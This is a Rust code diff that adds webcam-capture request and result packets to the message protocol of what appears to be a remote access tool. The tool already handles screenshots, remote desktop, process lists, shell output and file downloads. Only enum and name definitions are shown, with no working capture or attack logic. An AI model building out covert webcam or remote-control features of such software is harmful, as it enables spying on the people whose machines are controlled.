@@ -35,10 +35,10 @@ pub enum ServerboundPacket {
     EncryptionConfirm(Vec<u8>, Vec<u8>), // encrypted secret and token
     ClientInfo(ClientInfo),
     ScreenshotResult(Vec<u8>),
+    WebcamResult(Vec<u8>),
     RemoteDesktopFrame(RemoteDesktopFrame),
     ProcessList(ProcessList),
     ShellOutput(String),
-
 
     DonwloadFileResult(FileData),
 
@@ -65,6 +65,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::EncryptionConfirm(_, _) => "EncryptionConfirm",
             ServerboundPacket::ClientInfo(_) => "ClientInfo",
             ServerboundPacket::ScreenshotResult(_) => "ScreenshotResult",
+            ServerboundPacket::WebcamResult(_) => "WebcamResult",
             ServerboundPacket::RemoteDesktopFrame(_) => "RemoteDesktopFrame",
             ServerboundPacket::ProcessList(_) => "ProcessList",
             ServerboundPacket::ShellOutput(_) => "ShellOutput",
@@ -84,6 +85,7 @@ pub enum ClientboundPacket {
     EncryptionAck,
     InitClient,
     ScreenshotDisplay(String),
+    RequestWebcam,
     Reconnect,
     Disconnect,
     StartRemoteDesktop(RemoteDesktopConfig),
@@ -133,6 +135,7 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::EncryptionAck => "EncryptionAck",
             ClientboundPacket::InitClient => "InitClient",
             ClientboundPacket::ScreenshotDisplay(_) => "ScreenshotDisplay",
+            ClientboundPacket::RequestWebcam => "RequestWebcam",
             ClientboundPacket::Reconnect => "Reconnect",
             ClientboundPacket::Disconnect => "Disconnect",
             ClientboundPacket::StartRemoteDesktop(_) => "StartRemoteDesktop",
